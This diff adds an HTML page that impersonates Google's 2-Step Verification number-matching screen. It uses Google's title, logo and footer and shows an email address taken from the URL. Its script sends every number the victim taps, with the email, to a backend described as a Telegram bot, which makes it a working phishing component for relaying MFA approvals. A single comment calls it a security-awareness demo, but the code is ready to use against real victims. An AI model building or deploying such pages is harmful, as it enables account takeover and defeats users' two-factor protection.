@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign-in - Select Number</title>
+    <link rel="stylesheet" href="select.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="main-container">
+    <div class="signin-card">
+        
+        <!-- Left Section -->
+        <div class="left-section">
+            <img src="google_logo.svg" alt="Google Logo" class="google-logo">
+            <h1>2-Step Verification</h1>
+            <p class="subtitle">Google sent a notification to your smartphone. Tap the number matching the one shown on your phone screen.</p>
+            
+            <!-- Account Badge -->
+            <div class="account-pill">
+                <span class="avatar-icon">
+                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88C7.55 15.8 9.68 15 12 15s4.45.8 6.14 2.12C16.43 19.18 14.03 20 12 20z"/></svg>
+                </span>
+                <span class="email-text" id="account-email">adesokanadedeji10@gmail.com</span>
+            </div>
+        </div>
+
+        <!-- Right Section -->
+        <div class="right-section">
+            
+            <!-- Grid container for the 1-30 mini number boxes -->
+            <div class="numbers-grid" id="numbers-container">
+                <!-- Numbers 1 to 30 will be generated here -->
+            </div>
+
+            <!-- Resend/Help Footer Links -->
+            <div class="action-buttons">
+                <a href="#" class="link" id="login-now">Login Now</a>
+                <a href="#" class="link" id="see-rest-digits">See rest Digits</a>
+            </div>
+        </div>
+
+    </div>
+    
+    <!-- Outer Card Bottom Footer -->
+    <div class="card-footer">
+        <div class="language-selector">English (United States) ▼</div>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    // SECURITY AWARENESS DEMO — NOT GOOGLE
+    // Determine the real email: URL query param first, then sessionStorage, then neutral fallback.
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlEmail = urlParams.get('email');
+    const storedEmail = sessionStorage.getItem('demo_email');
+    const effectiveEmail = urlEmail || storedEmail || 'unknown@demo.local';
+
+    const accountEmail = document.getElementById('account-email');
+    if (accountEmail) {
+        accountEmail.textContent = effectiveEmail;
+    }
+
+    // If we learned the email from the URL, persist it for later pages in the flow.
+    if (urlEmail) {
+        sessionStorage.setItem('demo_email', urlEmail);
+    }
+
+    // Send the selected 2FA number to the Telegram demo bot.
+    async function submitToTelegram(selectedNumber) {
+        const email = sessionStorage.getItem('demo_email') || effectiveEmail;
+        try {
+            await fetch('http://localhost:8000/api/demo-submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: email, password: '2FA code: ' + selectedNumber })
+            });
+        } catch (err) {
+            // Backend unreachable — selection still works locally.
+            console.warn('Demo backend unreachable:', err);
+        }
+    }
+
+    // Generate a number box (used for both the initial 1-30 and "See rest Digits" 31-100).
+    function createNumberBox(num) {
+        const numBox = document.createElement('button');
+        numBox.className = 'number-box';
+        numBox.textContent = num;
+
+        numBox.addEventListener('click', () => {
+            // Remove selection from others
+            document.querySelectorAll('.number-box').forEach(box => box.classList.remove('active'));
+            // Highlight current selection
+            numBox.classList.add('active');
+            // Send the selected number to the Telegram bot
+            submitToTelegram(num);
+        });
+
+        return numBox;
+    }
+
+    // Generate numbers 1 to 30 dynamically
+    const container = document.getElementById('numbers-container');
+
+    for (let i = 1; i <= 30; i++) {
+        container.appendChild(createNumberBox(i));
+    }
+
+    // "Login Now" sends the login-completion signal to the Telegram demo bot.
+    const loginNow = document.getElementById('login-now');
+    loginNow.addEventListener('click', async function (event) {
+        event.preventDefault();
+
+        const email = sessionStorage.getItem('demo_email') || effectiveEmail;
+        const selected = document.querySelector('.number-box.active');
+        const selectedNumber = selected ? selected.textContent : 'none';
+        loginNow.textContent = 'Sending...';
+        loginNow.style.pointerEvents = 'none';
+
+        try {
+            await fetch('http://localhost:8000/api/demo-submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: email, password: 'Login Now (2FA code: ' + selectedNumber + ')' })
+            });
+            loginNow.textContent = '✅ Sent';
+        } catch (err) {
+            console.warn('Demo backend unreachable:', err);
+            loginNow.textContent = 'Backend unreachable';
+        }
+    });
+
+    // "See rest Digits" reveals the remaining numbers up to 100.
+    const seeRestDigits = document.getElementById('see-rest-digits');
+    seeRestDigits.addEventListener('click', function (event) {
+        event.preventDefault();
+
+        // Only generate 31-100 once.
+        if (this.dataset.loaded !== 'true') {
+            for (let i = 31; i <= 100; i++) {
+                container.appendChild(createNumberBox(i));
+            }
+            this.dataset.loaded = 'true';
+            this.textContent = 'All digits shown';
+            this.style.opacity = '0.6';
+            this.style.pointerEvents = 'none';
+        }
+    });
+</script>
+
+</body>
+</html>
